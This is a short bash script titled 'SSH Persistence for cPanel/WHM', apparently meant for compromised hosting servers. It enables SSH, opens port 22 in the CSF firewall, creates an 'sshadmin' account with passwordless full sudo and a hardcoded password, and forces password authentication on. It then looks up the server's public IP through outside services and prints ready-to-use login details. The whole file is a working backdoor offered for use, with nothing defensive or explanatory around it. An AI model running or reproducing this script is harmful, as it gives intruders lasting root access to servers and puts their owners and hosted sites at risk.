#!/bin/bash
# SSH Persistence for cPanel/WHM - Fixed Password

echo "=== SSH Persistence for cPanel/WHM ==="

# Start and enable SSH
systemctl enable sshd 2>/dev/null
systemctl start sshd 2>/dev/null

# Open port 22 in CSF
if [ -f /etc/csf/csf.conf ]; then
    sed -i 's/TCP_IN = "/TCP_IN = "22,/' /etc/csf/csf.conf 2>/dev/null
    csf -r >/dev/null 2>&1
fi

# Create user with full sudo access
USER="sshadmin"

if ! id "$USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$USER"
    echo "$USER ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USER
    chmod 440 /etc/sudoers.d/$USER
fi

# Set fixed password
PASS="Takhin@l4tt"
echo "$USER:$PASS" | chpasswd

# Configure SSH
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null

# Restart SSH
systemctl restart sshd 2>/dev/null

# Get IP
IP=$(curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || hostname -I | awk '{print $1}')

echo "=================================="
echo "SSH Setup Done on cPanel Server"
echo "=================================="
echo "IP       : $IP"
echo "User     : $USER"
echo "Password : Takhin@l4tt"
echo "Port     : 22"
echo "=================================="
echo "Full sudo access granted"
echo "Connect: ssh $USER@$IP"
echo "=================================="
echo "Password saved."
